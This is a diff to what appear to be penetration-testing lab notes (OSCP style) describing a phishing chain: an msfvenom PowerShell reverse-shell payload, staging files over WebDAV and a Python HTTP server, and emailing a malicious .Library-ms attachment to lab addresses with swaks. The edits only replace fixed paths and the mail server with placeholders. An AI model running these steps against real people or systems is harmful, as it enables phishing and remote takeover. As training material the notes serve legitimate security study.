@@ -41,7 +41,7 @@ msfvenom -p windows/powershell_reverse_tcp LHOST=192.168.45.163 LPORT=4444 NOEXI
 
 - Host the 2nd stage via webdav (shell 1)
 ```bash
-/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/oscp/lab/webdav/
+/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root .
 ```
 
 - Create a copy of the library and use that to transfer those two files to kali
@@ -49,7 +49,7 @@ msfvenom -p windows/powershell_reverse_tcp LHOST=192.168.45.163 LPORT=4444 NOEXI
 
 - Host the 3rd stage via HTTP (shell 2)
 ```bash
-cd /home/kali/oscp/lab/ATP23/phishing/webserver && python3 -m http.server 8000
+python3 -m http.server 8000
 ```
 
 - Receive reverse shell (shell 3)
@@ -70,5 +70,5 @@ John
 
 - Shell 4
 ```bash
-cd ~/oscp/lab/ATP23/phishing/ && sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.209.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
+sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --body @body.txt --header "Subject: Staging Script" --suppress-data --server $ip_mailserver [-au $username -ap $password]
 ```
